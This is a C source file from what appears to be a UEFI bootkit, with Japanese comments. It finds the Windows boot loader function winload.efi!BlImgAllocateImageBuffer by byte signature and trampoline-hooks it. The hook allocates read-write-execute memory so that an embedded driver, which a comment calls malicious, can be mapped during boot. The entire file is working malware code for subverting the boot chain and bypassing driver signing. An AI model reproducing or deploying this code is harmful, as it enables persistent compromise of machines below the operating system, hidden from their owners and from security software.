#include "BlImgAllocateImageBuffer.h"
#include "Trampoline.h"
#include "Serial.h"
#include "Mapper.h"
#include "Pe.h"
#include "BinDriver.h"

#include <efilib.h>

#define BL_MEMORY_TYPE_APPLICATION (0xE0000012)
#define BL_MEMORY_ATTRIBUTE_RWX (0x424000)

// BlImgAllocateImageBufferの型
typedef EFI_STATUS(EFIAPI* BL_IMG_ALLOCATE_IMAGE_BUFFER)(VOID**, UINTN, UINT32, UINT32, VOID*, UINT32);
// BlImgAllocateImageBufferの先頭アドレス
BL_IMG_ALLOCATE_IMAGE_BUFFER BlImgAllocateImageBuffer;

// BlImgAllocateImageBufferの元命令を保持
CHAR8 OriginalBlImgAllocateImageBuffer[TRAMPOLINE_SIZE] = { 0 };

// BlImgAllocateImageBufferのシグネチャ
// 48 89 5C 24 18 55 56 57  41 54 41 55 41 56 41 57
// 48 8B EC 48 83 EC 50 4C  8B 39 4C 8D 62 FF 48 83
CONST CHAR8 SigBlImgAllocateImageBuffer[] = {
    "\x48\x89\x5C\x24\x18\x55\x56\x57\x41\x54\x41\x55\x41\x56\x41\x57"
    "\x48\x8B\xEC\x48\x83\xEC\x50\x4C\x8B\x39\x4C\x8D\x62\xFF\x48\x83"
};

CONST CHAR8 MaskBlImgAllocateImageBuffer[] = {
    "xxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxx"
};

MAP_INFO Mapper = { 0 };

EFI_STATUS EFIAPI HookedBlImgAllocateImageBuffer(VOID** ImageBuffer, UINTN ImageSize, UINT32 MemoryType, UINT32 Attributes, VOID* Unused, UINT32 Flags)
{
    EFI_STATUS Status;

    SerialPrint(L"===== HookedBlImgAllocateImageBuffer =====\r\n");

    do
    {
        // winload.efi!BlImgAllocateImageBufferをアンフックする
        TrampolineUnhook(BlImgAllocateImageBuffer, OriginalBlImgAllocateImageBuffer, FALSE);

        Status = BlImgAllocateImageBuffer(ImageBuffer, ImageSize, MemoryType, Attributes, Unused, Flags);
        if (!EFI_ERROR(Status) && MemoryType == BL_MEMORY_TYPE_APPLICATION)
        {
            // ドライバーをマップする領域を確保
            // 1度確保に失敗したら、それ以降行わない
            Mapper.AllocatedBufferStatus = BlImgAllocateImageBuffer(&Mapper.AllocatedBuffer, GetImageSize(DriverBinary), MemoryType, BL_MEMORY_ATTRIBUTE_RWX, Unused, 0);
            if (EFI_ERROR(Mapper.AllocatedBufferStatus))
            {
                SerialPrint(L"[-] Failed to allocate(Status=%d)\r\n", Mapper.AllocatedBufferStatus);
                Mapper.AllocatedBuffer = NULL;
            }
            else
            {
                SerialPrint(L"[+] Allocated mapper = 0x%llx\r\n", Mapper.AllocatedBuffer);
            }

            break;
        }

        SerialPrint(L"[-] Failed to allocate\r\n");
        SerialPrint(L"[-]     -> ImageBuffer = 0x%llx\r\n", ImageBuffer);
        SerialPrint(L"[-]     -> ImageSize = 0x%llx\r\n", ImageSize);
        SerialPrint(L"[-]     -> MemoryType = 0x%llx\r\n", MemoryType);
        SerialPrint(L"[-]     -> Attributes = 0x%llx\r\n", Attributes);
        SerialPrint(L"[-]     -> Unused = 0x%llx\r\n", Unused);
        SerialPrint(L"[-]     -> Flags = 0x%llx\r\n", Flags);
        SerialPrint(L"[+] continue...\r\n");

        // winload.efi!BlImgAllocateImageBufferを再度フック
        TrampolineHook(HookedBlImgAllocateImageBuffer, BlImgAllocateImageBuffer, OriginalBlImgAllocateImageBuffer, FALSE);
    } while (FALSE);

    return Status;
}

EFI_STATUS EFIAPI SetupBlImgAllocateImageBuffer(VOID* WinloadBase)
{
    EFI_STATUS Status = EFI_NOT_FOUND;

    VOID* BaseBlImgAllocateImageBuffer = NULL;

    do
    {
        Print(L"[+] Find BlImgAllocateImageBuffer in winload.efi\r\n");

        // winload.efi!BlImgAllocateImageBufferの先頭アドレスを探す
        BaseBlImgAllocateImageBuffer = FindPatternFromSections(WinloadBase, SigBlImgAllocateImageBuffer, MaskBlImgAllocateImageBuffer);
        if (BaseBlImgAllocateImageBuffer == NULL)
        {
            Print(L"[-] Failed to find BlImgAllocateImageBuffer\r\n");
            break;
        }
        Print(L"[+] BlImgAllocateImageBuffer is 0x%llx\r\n", BaseBlImgAllocateImageBuffer);

        // winload.efi!BlImgAllocateImageBufferをフック
        // 悪意のあるドライバのメモリバッファを確保する
        BlImgAllocateImageBuffer = TrampolineHook(HookedBlImgAllocateImageBuffer, BaseBlImgAllocateImageBuffer, OriginalBlImgAllocateImageBuffer, TRUE);
        if (BlImgAllocateImageBuffer == NULL)
        {
            Print(L"[-] Failed to hook BlImgAllocateImageBuffer\r\n");
            break;
        }
        Print(L"[+] Hooked BlImgAllocateImageBuffer\r\n");

        Status = EFI_SUCCESS;
    } while (FALSE);

    return Status;
}
